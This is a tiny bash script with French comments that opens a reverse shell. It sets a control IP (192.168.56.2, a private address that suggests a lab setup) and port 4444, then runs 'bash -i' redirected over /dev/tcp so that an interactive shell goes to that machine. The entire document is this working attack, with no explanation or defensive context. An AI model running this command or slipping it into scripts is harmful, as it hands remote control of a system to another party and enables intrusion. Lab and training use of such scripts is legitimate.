
```bash
#!/bin/bash

#IP et port de la machine
CONTROL_IP="192.168.56.2"
CONTROL_PORT="4444"

#Tentative de connexion en reverse shell
bash -i >& /dev/tcp/$CONTROL_IP/$CONTROL_PORT 0>&1
```